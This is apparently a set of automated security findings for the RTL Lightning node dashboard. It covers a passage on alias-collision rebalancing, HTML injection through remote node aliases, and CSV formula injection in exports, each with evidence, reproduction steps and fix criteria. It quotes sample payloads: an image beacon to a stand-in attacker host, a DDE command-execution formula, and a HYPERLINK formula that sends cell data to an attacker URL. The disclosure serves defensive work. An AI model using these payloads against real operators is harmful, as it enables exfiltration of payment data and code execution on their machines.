5. [src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts:93–98](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/eclair/peers-channels/channels/channel-rebalance-modal/channel-rebalance.component.ts#L93-L98)
   After resolution the step label shows only 'Peer: <alias>'; nodeId is used only when alias is empty. Two channels with the same alias are indistinguishable to the operator at the confirmation step.
6. [server/controllers/eclair/channels.ts:40–47](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/channels.ts#L40-L47)
   simplifyAllChannels copies channel.alias verbatim from Eclair /nodes (the remote peer's gossip node_announcement, attacker-chosen, up to 32 bytes) and, for peers without an announcement, falls back to the first 20 hex chars of nodeId - a string another peer can also announce as its alias. The alias is the only key the rebalance modal's typed path matches on.
7. [server/controllers/eclair/channels.ts:186–200](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/channels.ts#L186-L200)
   circularRebalance builds the route as sourceShortChannelId + findroutebetweennodes(source->target) + targetShortChannelId and pays it via sendPaymentToRouteRequestCall (payments.ts:134-138, /sendtoroute with only shortChannelIds, amountMsat, invoice). The final hop is the resolved target channel, so the resolved peer forwards the HTLC and is paid its advertised forwarding fee, and the operator's outbound liquidity lands on that channel.
8. [src/app/eclair/peers-channels/channels/channels-tables/channel-open-table/channel-open-table.component.ts:128–141](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/eclair/peers-channels/channels/channels-tables/channel-open-table/channel-open-table.component.ts#L128-L141)
   Reachability: the Eclair open-channels table opens ECLChannelRebalanceComponent with the store's activeChannels and the selected channel; the dialog is live production UI despite Application_features.md listing rebalance as LND-only.
9. [src/app/eclair/peers-channels/channels/open-channel-modal/open-channel.component.ts:106–119](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/eclair/peers-channels/channels/open-channel-modal/open-channel.component.ts#L106-L119)
   The sibling Open Channel dialog performs the same typed-alias-to-peer resolution and accepts it only when exactly one peer matches (selPeer.length === 1), otherwise flagging notfound - the uniqueness guard the rebalance modal omits.

## Impact
The operator's node executes a payment to a target the operator did not choose: outbound liquidity moves into the attacker's channel and the attacker's forwarding fee for the final hop is paid, with the intended rebalance still outstanding. Assumption about the dependency: Eclair's /sendtoroute (RTL sends only shortChannelIds, amountMsat, invoice) prices each hop from the local channel_update, so the attacker's advertised fee on its channel is paid and is not subject to the findroutebetweennodes fee limits, since RTL appends the target scid after route finding; this could not be verified in the checkout and caps the rating. No data is disclosed and RTL stays available; loss is bounded by the rebalance amount and the attacker's fee policy, so integrity impact is low.

## Reproduction steps
1. A remote Lightning peer with an open NORMAL channel to the operator's Eclair node (inbound liquidity >= the rebalance amount) announces an alias equal, case-insensitively, to another of the operator's channel peers (or to the 20-hex-char nodeId prefix RTL shows for a peer without an announcement) and keeps its channel at least as well balanced as the impersonated peer's so it sorts first. The alias reaches RTL via Eclair /nodes with no RTL credentials. The operator opens Circular Rebalance, types the impersonated alias into 'Receive from Peer', blurs or presses Enter, and submits; the attacker's channel is silently chosen as the target. Requires a channel with the victim node and the typed (not clicked) selection path.

## Recommended fix
1. onSelectedPeerChanged in the Eclair rebalance modal resolves a typed alias to a channel by picking the first case-insensitive alias match, treating a non-unique, peer-chosen label as an identifier. Fix criteria: A typed value must resolve to a channel only when it identifies exactly one active channel (unique alias match, or a match on shortChannelId/channelId); with zero or multiple matches the control must be marked invalid and Rebalance must be blocked. Verify by loading two channels with aliases differing only in case, typing the alias, blurring, and confirming no channel is selected and the form shows an error; the LND sibling should be fixed the same way.
2. The confirmation step shows only the alias, so two channels with colliding aliases cannot be told apart before the payment is sent. Fix criteria: The step label and status view must display the resolved channel's shortChannelId (or nodeId) alongside the alias so the operator can see which channel will receive the rebalance before confirming.

---
**Severity:** LOW
**Status:** Open
**Category:** Duplicate identifier resolution
**CWE:** [CWE-694](https://cwe.mitre.org/data/definitions/694.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257269

---

# Remote node alias rendered through innerHTML in LND HTLC hop details dialog

## Details
In the LND Payments page, viewing an HTLC's details (Transactions > Payments > expand payment > 'View N') calls getHopDetails for every hop of the HTLC route. For each hop it looks up the node alias (from the LND peer list, whose alias field the backend fills from LND's graph, or via GET /rtl/api/lnd/network/node/{pubkey}, which proxies LND /v1/graph/node and returns the gossip record verbatim) and concatenates it, unescaped, into an HTML string: '<pre>Channel: ' + alias.padEnd(20) + '&Tab;&Tab;&Tab;Amount (Sats): ' + amt + '</pre>'. The strings are tagged DataTypeEnum.ARRAY and dispatched through openAlert; AlertMessageComponent's ARRAY branch (alert-message.component.html:54) renders each one with [innerHTML].

A node alias is a BOLT 7 field chosen freely by the remote node (up to 32 bytes, LND does not restrict its characters), so any node that appears in a route of an outgoing payment, as the payee or as an intermediate routing hop, controls the markup. No bypassSecurityTrustHtml is involved (openAlert JSON-clones the payload, so only plain strings reach the binding), so Angular's default DomSanitizer is the only control. It strips <script>, on* handlers, javascript: URLs and style, but keeps a, img, video, audio, source, picture elements with http(s)/protocol-relative href/src/srcset/poster, plus target, download, rel, title, class and hidden attributes. Aliases such as '<img src=//atk.tld/p>' (18 bytes) or '<a href=//atk.tld>Dispute</a>' (28 bytes) fit the 32-byte limit and reach the DOM as markup.

What a remote Lightning node (threat-model adversary 3) gains inside the operator's authenticated RTL session: (1) a beacon: the <img>/<video> fetch fires when the dialog opens, disclosing the operator browser's IP address, user agent and the moment they inspected the payment (a node reachable only over Tor otherwise exposes none of this, and the pubkey of the paying node is already known to the payee); (2) content spoofing in a trusted dialog: injected links/images/formatting next to the payment hash, preimage and amount, e.g. a phishing 'dispute' link, with class= able to reuse RTL's own CSS classes. Script execution is blocked by the sanitizer, so this is HTML/content injection rather than full XSS.

Root cause: the caller intentionally builds markup from untrusted data and the shared dialog provides an innerHTML branch (DataTypeEnum.ARRAY) to display it; the sibling ConfirmationMessageComponent has the identical sink. The CLN Liquidity Ads path through that sibling is recorded separately as cln-liquidity-ads-gossip-address-html-injection-confirmation-dialog; this record is a different source (BOLT 7 alias instead of DNS address), different implementation (LND), different caller and different sink component (AlertMessageComponent). The other two ARRAY callers are not affected: on-chain dest_addresses are addresses LND derives from output scripts, and the liquidity-ads features list is built from the constant NODE_FEATURES_CLN.

Assumptions stated: Angular 20 DomSanitizer allow-list as described above; LND accepts and re-serves any UTF-8 alias of up to 32 bytes without character filtering.

## Evidence
1. [src/app/lnd/transactions/payments/lightning-payments.component.ts:314–329](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/transactions/payments/lightning-payments.component.ts#L314-L329)
   getHopDetails builds a raw HTML string per hop: '<pre>Channel: ' + alias.padEnd(20) + '&Tab;...' + '</pre>'. The alias is peerFound.alias (LND peer list, alias filled from gossip by the backend) or res.node.alias (GET /network/node/{pubkey}, LND graph gossip). Neither value is HTML-escaped; padEnd does not truncate or filter.
2. [src/app/lnd/transactions/payments/lightning-payments.component.ts:348–391](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/transactions/payments/lightning-payments.component.ts#L348-L391)
   showHTLCView resolves all hop strings and prepareData tags them as { key: 'hops', value: hopsDetails, type: DataTypeEnum.ARRAY } before dispatching openAlert. The ARRAY type selects the innerHTML branch of the shared dialog.
3. [src/app/shared/components/data-modal/alert-message/alert-message.component.html:52–55](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/shared/components/data-modal/alert-message/alert-message.component.html#L52-L55)
   The DataTypeEnum.ARRAY branch renders each element with [innerHTML]="arrayObj". It exists to display the '<pre>' markup built by the caller, so the attacker-controlled alias is parsed as HTML rather than text. Only Angular's default DomSanitizer applies (no SafeHtml on this path).
4. [src/app/store/rtl.effects.ts:120–134](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/store/rtl.effects.ts#L120-L134)
   openAlert JSON-clones the payload and opens AlertMessageComponent; the hop strings reach the template unchanged (plain strings, so sanitizer applies but nothing escapes the alias).
5. [server/controllers/lnd/graph.ts:53–66](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/graph.ts#L53-L66)
   getGraphNode proxies LND /v1/graph/node/{pubkey} and returns the body verbatim, including node.alias as announced by the remote node in its node_announcement.
6. [server/controllers/lnd/peers.ts:9–16](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/peers.ts#L9-L16)
   getAliasForPeers copies aliasBody.node.alias (gossip) into each peer object returned to the UI; this is the this.peers list consulted first by getHopDetails.
7. [src/app/lnd/transactions/payments/lightning-payments.component.html:284](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/transactions/payments/lightning-payments.component.html#L284)
   The 'View N' button on an HTLC row calls onHTLCClick(htlc, payment), the routine operator action that triggers the render.

## Impact
Confidentiality LOW: operator browser IP, user agent and viewing time leak to the remote node through an injected image/media load, correlating the node identity with a network location. Integrity LOW: the attacker controls part of a trusted RTL dialog's content (links, images, formatting, RTL CSS classes) next to payment details, enabling spoofing/phishing. No script execution, so session tokens, credentials and node actions are not directly reachable; availability unaffected.

## Reproduction steps
1. The attacker runs a Lightning node whose announced alias contains markup; gossip delivers it to the operator's LND. The attacker's node must appear in the route of one of the operator's outgoing payments: trivially as the payee of any invoice the operator pays them, or as a routing hop (cheap-fee routing node). When the operator later opens that payment's HTLC details, a routine click in the Payments table, the alias is parsed as HTML and an <img> beacon fires with no further interaction. No RTL authentication, no sanitizer bypass and no non-default configuration are needed; the only precondition is the payment-history state.

## Recommended fix
1. getHopDetails in lightning-payments.component.ts concatenates the remote node alias into an HTML string that is later bound with [innerHTML]; untrusted gossip data is treated as markup. Fix criteria: Hop details must reach the DOM only as text: either pass structured values (alias, amount) rendered by interpolation, or HTML-escape the alias (and any other node-supplied field) before it is placed in markup. Verify by giving a peer the alias '<img src=//example.invalid/x>' and confirming the HTLC dialog shows the literal text and performs no network request.
2. The shared AlertMessageComponent and ConfirmationMessageComponent render every DataTypeEnum.ARRAY element via [innerHTML], so any caller that places node- or peer-supplied strings in an ARRAY field becomes an HTML sink. Fix criteria: The ARRAY branch of both dialogs must render elements as text by default; any need for formatting should be met by a template (e.g. a <pre> element around interpolated text) or by an explicit, separately typed field that only ever receives developer-constant markup. Verify that no [innerHTML] binding in the dialogs can receive a runtime string originating from node, peer or swap-server responses.

---
**Severity:** LOW
**Status:** Open
**Category:** HTML injection
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257267

---

# CSV export writes peer-controlled fields raw, enabling spreadsheet formula injection

## Details
RTL lets the operator export most data tables (peers, channels, payments, invoices, forwarding history, offers, liquidity ads, swaps) to CSV via CommonService.downloadFile -> convertToCSV. convertToCSV concatenates each field value directly into the row (`dataRow += obj[key] + ','`), with no quoting and no neutralisation of formula-leading characters ('=', '+', '-', '@', tab, CR) and no escaping of ',' or line breaks. The committed frontend bundle contains the same code.

Several exported fields are chosen by remote Lightning counterparties, not by the operator: a peer's node alias (gossip; attached by the backend in server/controllers/lnd/peers.ts and channels.ts as `alias` / `remote_alias`, and copied into forwarding-history `alias_in`/`alias_out` by DataService.getForwardingHistory), the `description` of an invoice the operator has paid (decoded from the payee's BOLT11 payment_request in the Payments export), and CLN offer bookmark `title`/`description`/`issuer` (decoded from a remote offer). A BOLT 7 alias is at most 32 bytes, which fits a DDE payload such as `=cmd|' /C calc'!A0` or a HYPERLINK to a short domain; invoice and offer descriptions have no such limit and carry longer payloads such as `=HYPERLINK("https://attacker/?"&A1&B1,"open")`. The value is written verbatim. When the operator opens the downloaded file in Excel, LibreOffice Calc or Google Sheets, a cell beginning with '=' is evaluated as a formula: data from neighbouring cells (balances, pubkeys, channel points, payment hashes and preimages are among the exported columns) can be exfiltrated via HYPERLINK, or DDE/command execution can be triggered after the spreadsheet's warning prompt. Because ',' and newlines are not escaped either, an attacker value can inject whole extra rows/columns, corrupting the operator's records.

This is CWE-1236 (Improper Neutralization of Formula Elements in a CSV File). RTL's server, config and node credentials are unaffected; the impact lands on the operator's workstation and requires the operator to export and open the file, so it rates low, but the path from an unauthenticated remote peer to the operator's spreadsheet is complete and deterministic, and no shipped control stands in front of it.

## Evidence
1. [src/app/shared/services/common.service.ts:273–337](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/shared/services/common.service.ts#L273-L337)
   convertToCSV builds every cell with plain string concatenation (`dataRow += obj[key] + ','` at 320/324/327, arrays at 298-303, objects at 306). No cell is quoted and no leading '=', '+', '-', '@', tab or CR is neutralised, and embedded ',' or CR/LF are not escaped, so a field value controls both cell content and the row/column structure of the exported file. The committed frontend/main.*.js bundle contains the identical logic.
2. [src/app/shared/services/common.service.ts:252–270](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/shared/services/common.service.ts#L252-L270)
   downloadFile wraps the convertToCSV output in a text/csv Blob (BOM-prefixed) and triggers a browser download with a .csv name, so the operator receives a file their spreadsheet application will parse and evaluate.
3. [server/controllers/lnd/peers.ts:9–14](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/peers.ts#L9-L14)
   getAliasForPeers fetches /v1/graph/node/<pubkey> and assigns `peer.alias = aliasBody.node.alias` — the remote peer's self-announced gossip alias — onto the listpeers row without any sanitisation; this row is what the Peers table exports.
4. [server/controllers/lnd/channels.ts:12–17](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/channels.ts#L12-L17)
   getAliasForChannel sets `channel.remote_alias` from the same gossip alias; channel rows are exported by the open/pending/closed channel tables and remote_alias is further copied into forwarding-history rows.
5. [src/app/shared/services/data.service.ts:246–273](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/shared/services/data.service.ts#L246-L273)
   getForwardingHistory copies `storedChannels[idx].remote_alias` into event.alias_in / alias_out; these enriched events are the rows exported by the forwarding-history page, so a remote peer's alias lands in the CSV verbatim.
6. [src/app/lnd/transactions/payments/lightning-payments.component.ts:505–530](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/transactions/payments/lightning-payments.component.ts#L505-L530)
   The Payments export decodes each payee-issued BOLT11 payment_request and attaches `decodedPayment.description` (payee-chosen, up to 639 bytes) to the row before passing it to downloadFile, giving a second remote-controlled field with no alias length limit.
7. [src/app/lnd/peers-channels/peers/peers.component.ts:226](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/peers-channels/peers/peers.component.ts#L226)
   One of ~30 call sites: the Peers table export passes the node's listpeers rows (including the peer-chosen `alias` and `address`) straight to downloadFile; the same pattern is used for channels, payments, forwarding history, offers and CLN offer bookmarks.

## Impact
RTL itself (server, config, node credentials, session) is not affected: the injected content only alters the exported file. No confidentiality, integrity or availability impact on RTL. Subsequent-system impact: The operator's spreadsheet application evaluates the attacker's formula: HYPERLINK-style payloads can exfiltrate the contents of other exported cells (balances, pubkeys, payment hashes/preimages) to an attacker URL, and injected rows/columns corrupt the operator's exported records. Full command execution via DDE is possible on some spreadsheet setups but requires accepting additional prompts, so impact is rated low rather than high.

## Reproduction steps
1. A remote Lightning node holding no RTL credentials sets its gossip alias, issues an invoice with a crafted description that the operator pays, or publishes a crafted BOLT12 offer. The data reaches RTL through normal node operation (backend alias lookup, payment decode). The operator later clicks the CSV download button on an affected table and opens the file in a spreadsheet, which evaluates the injected formula. HYPERLINK exfiltration needs a click on the cell; DDE/command execution needs the operator to accept the application's warning. Assumes the operator's spreadsheet evaluates '='-leading CSV cells (Excel and LibreOffice Calc default behaviour).

## Recommended fix
convertToCSV emits field values without CSV quoting or neutralisation of formula-triggering leading characters, so untrusted strings from remote peers (aliases, descriptions, offer metadata) become executable spreadsheet formulas and can break row/column structure. Fix criteria: Every exported cell is RFC 4180-quoted (embedded quotes doubled, commas/newlines contained) and any value beginning with '=', '+', '-', '@', tab or CR is neutralised (e.g. prefixed with a single quote or a space) before being written. Verify by exporting a peers/forwarding-history table containing an alias such as `=1+1` and `a,b\n=2+2`: the resulting file opens as literal text in the same cell, and no extra rows/columns appear.

---
**Severity:** LOW
**Status:** Open
**Category:** CSV injection
**CWE:** [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257264